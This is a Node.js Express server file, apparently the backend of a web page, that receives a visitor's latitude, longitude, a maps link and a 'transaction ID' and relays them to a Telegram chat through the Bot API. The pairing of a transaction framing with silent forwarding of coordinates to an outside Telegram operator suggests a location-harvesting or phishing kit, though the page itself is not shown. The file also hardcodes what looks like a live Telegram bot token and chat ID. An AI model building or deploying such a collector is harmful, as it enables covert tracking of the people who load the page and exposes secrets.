// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Servir arquivos estáticos (HTML, CSS, imagens)
app.use(express.static(path.join(__dirname)));

// Rota para servir o index.html como página inicial
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const TELEGRAM_BOT_TOKEN = "7640580191:AAF7LA0-A4nd2LY_cvbjmDrLSM0KcJM3ksw"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-4950002868"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps, transactionId, timestamp } = req.body;

  const message = `📍 Nova Localização Recebida\n\n` +
    `ID da Transação: ${transactionId || 'N/A'}\n` +
    `Data/Hora: ${timestamp || new Date().toISOString()}\n` +
    `Latitude: ${latitude}\n` +
    `Longitude: ${longitude}\n` +
    `Maps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

const PORT = process.env.PORT || 8088;

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}`);
});